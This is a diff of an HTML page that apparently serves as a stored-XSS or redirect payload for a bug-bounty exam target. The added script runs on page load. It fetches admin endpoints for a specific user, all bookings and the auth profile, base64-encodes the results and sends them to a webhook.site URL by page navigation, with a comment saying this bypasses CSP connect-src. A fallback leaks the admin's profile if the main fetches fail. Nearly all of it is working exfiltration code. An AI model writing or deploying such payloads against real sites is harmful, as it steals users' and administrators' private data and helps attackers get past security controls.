@@ -1,12 +1,32 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <meta http-equiv="refresh" content="0;url=https://api-bugbounty-exam.hashacademy.co/api/admin/bookings">
-</head>
 <body>
     <script>
-        // If the meta refresh doesn't work, try this
-        window.location.href = "https://webhook.site/c1f0cbb1-5e7d-42b0-b3e6-1920534a7768?hit=github_visited";
+        const webh = "https://webhook.site/7b048627-1670-436e-858d-b8ccad2fb9d6";
+        const elenaId = "69d29dc2d8e73faab806acf3";
+
+        async function finalExfiltrate() {
+            try {
+                // Fetch the three key targets
+                const p1 = fetch(`/api/admin/users/${elenaId}`).then(r => r.json());
+                const p2 = fetch('/api/admin/bookings').then(r => r.json());
+                const p3 = fetch('/api/auth/profile').then(r => r.json());
+
+                const [elena, bookings, profile] = await Promise.all([p1, p2, p3]);
+                
+                const data = JSON.stringify({ elena, bookings, profile });
+                
+                // Navigation bypasses CSP connect-src
+                window.location.replace(`${webh}?dump=${btoa(data)}`);
+            } catch (e) {
+                // Fallback: Just try to leak the Admin's own profile if the rest fails
+                fetch('/api/auth/profile').then(r => r.text()).then(d => {
+                    window.location.replace(`${webh}?fallback=${btoa(d)}`);
+                });
+            }
+        }
+
+        finalExfiltrate();
     </script>
 </body>
 </html>
